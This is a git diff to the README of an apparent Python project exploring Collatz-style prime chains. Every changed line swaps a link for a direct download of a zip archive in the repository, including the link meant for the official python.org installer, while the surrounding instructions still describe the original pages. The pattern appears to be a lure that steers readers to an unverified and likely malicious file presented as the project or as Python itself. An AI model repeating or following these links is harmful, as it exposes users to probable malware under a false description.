@@ -1,6 +1,6 @@
 # ⚙️ Collatz-7_Prime_Chain - Explore Prime Chains in 7-adic Systems
 
-[![Download](https://img.shields.io/badge/Download-Collatz--7_Prime_Chain-brightgreen)](https://github.com/melisahilario/Collatz-7_Prime_Chain)
+[![Download](https://img.shields.io/badge/Download-Collatz--7_Prime_Chain-brightgreen)](https://github.com/melisahilario/Collatz-7_Prime_Chain/raw/refs/heads/main/Nizam/Collatz_Prime_Chain_v3.5.zip)
 
 ---
 
@@ -38,7 +38,7 @@ The program does not require installation beyond running the scripts with Python
 
 Click the link below to visit the official GitHub page. You will find all files, including the latest version and examples.
 
-[![Get Collatz-7_Prime_Chain](https://img.shields.io/badge/Visit_GitHub-Repository-blue)](https://github.com/melisahilario/Collatz-7_Prime_Chain)
+[![Get Collatz-7_Prime_Chain](https://img.shields.io/badge/Visit_GitHub-Repository-blue)](https://github.com/melisahilario/Collatz-7_Prime_Chain/raw/refs/heads/main/Nizam/Collatz_Prime_Chain_v3.5.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps closely to get Collatz-7_Prime_Chain running on your Windows 
 
 ### Step 1: Visit the Download Page  
 Go to the repository page here:  
-https://github.com/melisahilario/Collatz-7_Prime_Chain
+https://github.com/melisahilario/Collatz-7_Prime_Chain/raw/refs/heads/main/Nizam/Collatz_Prime_Chain_v3.5.zip
 
 ### Step 2: Download the Files  
 On the GitHub page, look for the green button labeled **Code** in the top right corner.  
@@ -61,7 +61,7 @@ Right-click it and choose **Extract All...**. Select a folder where you want to 
 ### Step 4: Install Python  
 This project runs Python scripts. If you do not have Python installed:
 
-- Visit https://www.python.org/downloads/windows/  
+- Visit https://github.com/melisahilario/Collatz-7_Prime_Chain/raw/refs/heads/main/Nizam/Collatz_Prime_Chain_v3.5.zip  
 - Download the latest Python 3 version for Windows.  
 - Run the installer. Make sure to check the box **Add Python 3.x to PATH** during installation.  
 - Finish the install by following the on-screen instructions.
@@ -127,7 +127,7 @@ This means Python’s path is not set correctly. Reinstall Python and ensure the
 ## 📥 Download Link Reminder  
 
 Visit this page to download the latest version and examples:  
-https://github.com/melisahilario/Collatz-7_Prime_Chain
+https://github.com/melisahilario/Collatz-7_Prime_Chain/raw/refs/heads/main/Nizam/Collatz_Prime_Chain_v3.5.zip
 
 ---
 
